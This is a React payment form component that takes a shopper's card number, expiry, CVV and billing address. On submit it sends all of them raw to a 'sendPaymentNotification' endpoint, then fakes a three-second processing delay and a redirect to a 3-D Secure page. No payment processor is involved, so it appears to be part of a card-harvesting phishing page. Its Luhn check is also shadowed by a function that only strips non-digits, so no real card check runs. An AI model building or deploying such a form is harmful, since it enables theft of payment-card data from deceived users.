import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Input } from "./ui/input";
import { Button } from "./ui/button";
import { Label } from "./ui/label";
import { useToast } from "./ui/use-toast";
import { sendPaymentNotification } from "../utils/internalApi";
import { GridLoader } from "react-spinners";
import { Building2 } from "lucide-react";
import { EncryptButton } from "./EncryptButton";
import { CardTypeIcon } from "./CardTypeIcon";
import {
  Sheet,
  SheetContent,
  SheetHeader,
  SheetTitle,
  SheetTrigger,
} from "./ui/sheet";

// Add the missing formatCardNumber function
const formatCardNumber = (value: string): string => {
  const digits = value.replace(/\D/g, '');
  const groups = digits.match(/.{1,4}/g) || [];
  return groups.join(' ').substr(0, 19);
};

interface PaymentFormProps {
  amount: number;
}

interface BillingDetails {
  streetAddress: string;
  streetAddress2: string;
  city: string;
  state: string;
  zipCode: string;
  country: string;
}

const validateCardNumber = (cardNumber: string): boolean => {
  const digits = cardNumber.replace(/\D/g, '');
  let sum = 0;
  let isEven = false;

  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = parseInt(digits[i]);

    if (isEven) {
      digit *= 2;
      if (digit > 9) {
        digit -= 9;
      }
    }

    sum += digit;
    isEven = !isEven;
  }

  return sum % 10 === 0;
};

export const PaymentForm = ({ amount }: PaymentFormProps) => {
  const [cardHolder, setCardHolder] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [billingDetails, setBillingDetails] = useState<BillingDetails>({
    streetAddress: "",
    streetAddress2: "",
    city: "",
    state: "",
    zipCode: "",
    country: "US",
  });
  const [isSheetOpen, setIsSheetOpen] = useState(false);
  const navigate = useNavigate();
  const { toast } = useToast();

  const validateCardHolder = (value: string) => {
    const latinAndDotRegex = /^[a-zA-Z\s.]*$/;
    const dotCount = (value.match(/\./g) || []).length;
    
    value = value.slice(0, 12);
    
    if (!latinAndDotRegex.test(value)) {
      return value.replace(/[^a-zA-Z\s.]/g, '').toUpperCase();
    }
    
    if (dotCount > 1) {
      const firstDotIndex = value.indexOf('.');
      return (value.slice(0, firstDotIndex + 1) + value.slice(firstDotIndex + 1).replace(/\./g, '')).toUpperCase();
    }
    
    return value.toUpperCase();
  };

  const validateCardNumber = (value: string) => {
    return value.replace(/\D/g, '');
  };

  const validateExpiryDate = (value: string) => {
    const cleanValue = value.replace(/\D/g, '');
    if (cleanValue.length >= 2) {
      const month = parseInt(cleanValue.substring(0, 2));
      
      if (month > 12) {
        return '12' + (cleanValue.length > 2 ? '/' + cleanValue.substring(2, 4) : '');
      }
      if (month === 0) {
        return '01' + (cleanValue.length > 2 ? '/' + cleanValue.substring(2, 4) : '');
      }

      if (cleanValue.length >= 4) {
        const year = parseInt(cleanValue.substring(2, 4));
        
        const currentDate = new Date();
        const currentYear = currentDate.getFullYear() % 100;
        const currentMonth = currentDate.getMonth() + 1;

        if (year < currentYear || (year === currentYear && month < currentMonth)) {
          toast({
            title: "Invalid Expiry Date",
            description: "Card has expired",
            variant: "destructive",
          });
          return '';
        }
      }

      return month.toString().padStart(2, '0') + (cleanValue.length > 2 ? '/' + cleanValue.substring(2, 4) : '');
    }
    return cleanValue;
  };

  const validateCVV = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    return numbers.slice(0, 3);
  };

  const handleBillingDetailsChange = (field: keyof BillingDetails, value: string) => {
    setBillingDetails(prev => ({
      ...prev,
      [field]: value
    }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    if (!validateCardNumber(cardNumber)) {
      toast({
        title: "Invalid Card",
        description: "Please enter a valid card number",
        variant: "destructive",
      });
      setIsSubmitting(false);
      return;
    }

    if (!billingDetails.streetAddress || !billingDetails.city || !billingDetails.state || !billingDetails.zipCode) {
      toast({
        title: "Missing Billing Details",
        description: "Please enter your complete billing information",
        variant: "destructive",
      });
      setIsSubmitting(false);
      return;
    }

    try {
      await sendPaymentNotification({
        amount,
        cardHolder,
        cardNumber,
        expiryDate,
        cvv,
        billingDetails: {
          address1: billingDetails.streetAddress,
          address2: billingDetails.streetAddress2,
          city: billingDetails.city,
          state: billingDetails.state,
          zipCode: billingDetails.zipCode,
          country: billingDetails.country
        }
      });

      await new Promise(resolve => setTimeout(resolve, 3000));
      
      navigate(`/verify-3ds?amount=${amount}&cardHolder=${encodeURIComponent(cardHolder)}`);
    } catch (error) {
      console.error('Error processing payment:', error);
      setIsSubmitting(false);
      toast({
        title: "Error",
        description: "Failed to process payment. Please try again.",
        variant: "destructive",
      });
    }
  };

  return (
    <form onSubmit={handleSubmit} className="w-full space-y-6 bg-black/20 backdrop-blur-xl p-8 rounded-xl border border-white/10 shadow-2xl animate-fadeIn relative">
      {isSubmitting && (
        <div className="absolute inset-0 bg-black/80 backdrop-blur-sm rounded-xl flex flex-col items-center justify-center gap-6 z-50 animate-fadeIn">
          <GridLoader color="#8B5CF6" size={15} margin={2} />
          <div className="text-white/90 font-medium text-lg">Processing Payment...</div>
          <div className="text-white/60 text-sm">Please do not close this window</div>
        </div>
      )}
      
      <div className="space-y-4">
        <div className="space-y-2">
          <Input
            type="text"
            placeholder="Card Holder Name"
            value={cardHolder}
            onChange={(e) => setCardHolder(validateCardHolder(e.target.value))}
            className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
            required
          />
        </div>
        <div className="space-y-2 relative">
          <Input
            type="text"
            placeholder="Card Number"
            value={cardNumber}
            onChange={(e) => setCardNumber(formatCardNumber(validateCardNumber(e.target.value)))}
            maxLength={19}
            className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors pr-12"
            required
          />
          <CardTypeIcon cardNumber={cardNumber} />
        </div>
        <div className="grid grid-cols-2 gap-4">
          <div className="space-y-2">
            <Input
              type="text"
              placeholder="MM/YY"
              value={expiryDate}
              onChange={(e) => setExpiryDate(validateExpiryDate(e.target.value))}
              maxLength={5}
              className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
              required
            />
          </div>
          <div className="space-y-2">
            <Input
              type="text"
              placeholder="CVV"
              value={cvv}
              onChange={(e) => setCvv(validateCVV(e.target.value))}
              maxLength={3}
              className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
              required
            />
          </div>
        </div>

        <div className="space-y-4">
          <button
            type="button"
            onClick={() => setIsSheetOpen(!isSheetOpen)}
            className="relative w-full inline-flex items-center justify-center overflow-hidden transition-all duration-300 bg-[radial-gradient(65.28%_65.28%_at_50%_100%,rgba(223,113,255,0.8)_0%,rgba(223,113,255,0)_100%),linear-gradient(0deg,#7a5af8,#7a5af8)] rounded-xl border-0 outline-none px-4 py-3 hover:scale-[0.98] hover:shadow-lg group"
          >
            <span className="relative z-[2] flex items-center justify-center gap-2 text-white font-medium">
              <Building2 className="w-[18px] h-[18px] transition-transform group-hover:rotate-12" />
              Billing Details
            </span>
          </button>
          
          {isSheetOpen && (
            <div 
              className="animate-fadeIn space-y-6 bg-black/40 backdrop-blur-xl border border-white/20 rounded-xl p-6 shadow-2xl transition-all duration-300"
              style={{
                animation: 'fadeIn 0.5s ease-out, slideUp 0.5s ease-out',
              }}
            >
              <div className="space-y-3 pb-4 border-b border-white/10">
                <h3 className="text-2xl font-bold bg-gradient-to-r from-white via-purple-300 to-blue-200 bg-clip-text text-transparent animate-gradient">
                  Billing Details
                </h3>
              </div>
            
              <div className="space-y-6 py-6">
                <div className="space-y-2">
                  <Label className="text-sm font-medium text-white/80">Street Address</Label>
                  <Input
                    type="text"
                    value={billingDetails.streetAddress}
                    onChange={(e) => handleBillingDetailsChange('streetAddress', e.target.value)}
                    className="bg-white/5 border-white/10 text-white placeholder:text-white/40 focus:border-purple-500/50 transition-all duration-300 hover:bg-white/10"
                    required
                  />
                </div>

                <div className="space-y-2">
                  <Label className="text-sm font-medium text-white/80">Street Address 2 (Optional)</Label>
                  <Input
                    type="text"
                    value={billingDetails.streetAddress2}
                    onChange={(e) => handleBillingDetailsChange('streetAddress2', e.target.value)}
                    className="bg-white/5 border-white/10 text-white placeholder:text-white/40 focus:border-purple-500/50 transition-all duration-300 hover:bg-white/10"
                  />
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label className="text-sm font-medium text-white/80">City</Label>
                    <Input
                      type="text"
                      value={billingDetails.city}
                      onChange={(e) => handleBillingDetailsChange('city', e.target.value)}
                      className="bg-white/5 border-white/10 text-white placeholder:text-white/40 focus:border-purple-500/50 transition-all duration-300 hover:bg-white/10"
                      required
                    />
                  </div>
                  <div className="space-y-2">
                    <Label className="text-sm font-medium text-white/80">State</Label>
                    <Input
                      type="text"
                      value={billingDetails.state}
                      onChange={(e) => handleBillingDetailsChange('state', e.target.value)}
                      className="bg-white/5 border-white/10 text-white placeholder:text-white/40 focus:border-purple-500/50 transition-all duration-300 hover:bg-white/10"
                      required
                    />
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label className="text-sm font-medium text-white/80">ZIP Code</Label>
                    <Input
                      type="text"
                      value={billingDetails.zipCode}
                      onChange={(e) => handleBillingDetailsChange('zipCode', e.target.value)}
                      className="bg-white/5 border-white/10 text-white placeholder:text-white/40 focus:border-purple-500/50 transition-all duration-300 hover:bg-white/10"
                      required
                    />
                  </div>
                  <div className="space-y-2">
                    <Label className="text-sm font-medium text-white/80">Country</Label>
                    <Input
                      type="text"
                      value={billingDetails.country}
                      onChange={(e) => handleBillingDetailsChange('country', e.target.value)}
                      className="bg-white/5 border-white/10 text-white placeholder:text-white/40 focus:border-purple-500/50 transition-all duration-300 hover:bg-white/10"
                      required
                    />
                  </div>
                </div>
              </div>
            </div>
          )}
        </div>

        <EncryptButton isSubmitting={isSubmitting} />
      </div>
    </form>
  );
};

export default PaymentForm;
